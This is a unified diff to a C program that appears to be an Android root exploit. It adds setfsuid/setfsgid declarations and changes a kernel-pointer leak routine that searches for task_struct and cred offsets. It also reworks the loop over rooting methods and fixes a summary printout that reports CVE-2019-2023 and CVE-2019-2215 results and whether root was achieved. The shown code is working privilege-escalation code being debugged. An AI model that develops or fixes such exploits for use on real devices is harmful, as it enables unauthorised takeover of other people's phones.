@@ -26,6 +26,13 @@
 #include <sys/syscall.h>
 #include <sys/resource.h>
 #include <sys/reboot.h>
+#include <stdint.h>
+#include <sys/fsuid.h>          /* for setfsuid/setfsgid (if available) */
+
+/* If the above header is not available on your NDK, uncomment the following:
+extern int setfsuid(uid_t uid);
+extern int setfsgid(gid_t gid);
+*/
 
 #include "binder.h"
 
@@ -408,12 +415,12 @@ static int leak_kernel_pointer(int *cred_off_out, int *al_off_out) {
     if (n < 0) return -1;
 
     data = (uint64_t *)aligned;
-    for (int i = 0; i < (n / 8); i++) {
+    for (size_t i = 0; i < (size_t)(n / 8); i++) {
         uint64_t val = data[i];
         if ((val & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
             g_task_struct = val;
             // オフセットを自動探索
-            for (int ci = 0; ci < NUM_OFFSETS; ci++) {
+            for (size_t ci = 0; ci < NUM_OFFSETS; ci++) {
                 uint64_t cred_addr = g_task_struct + g_offset_candidates[ci].cred;
                 // 簡易チェック: cred が有効なアドレスかどうか
                 if ((cred_addr & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
@@ -1106,7 +1113,7 @@ int main(void) {
         8  // dump
     };
 
-    for (int mi = 0; mi < sizeof(methods)/sizeof(methods[0]); mi++) {
+    for (size_t mi = 0; mi < sizeof(methods)/sizeof(methods[0]); mi++) {
         if (g_root_achieved) break;
 
         switch(methods[mi]) {
@@ -1154,7 +1161,13 @@ int main(void) {
     // ===== サマリー =====
     printf("\n==================================================\n");
     printf("  Summary:\n");
-    printf("    CVE-2019-2023: %s\n", cve_2019_2023_handle >= 0 ? "SUCCESS (handle=" + cve_2019_2023_handle + ")" : "FAILED");
+    // Fix string concatenation error
+    char msg[128];
+    if (cve_2019_2023_handle >= 0)
+        snprintf(msg, sizeof(msg), "SUCCESS (handle=%d)", cve_2019_2023_handle);
+    else
+        snprintf(msg, sizeof(msg), "FAILED");
+    printf("    CVE-2019-2023: %s\n", msg);
     printf("    CVE-2019-2215: %s\n", cve_2215_ok ? "LEAKED" : "FAILED");
     printf("    Method successes: %d\n", method_success);
     printf("    Root achieved: %s\n", g_root_achieved ? "YES" : "NO");
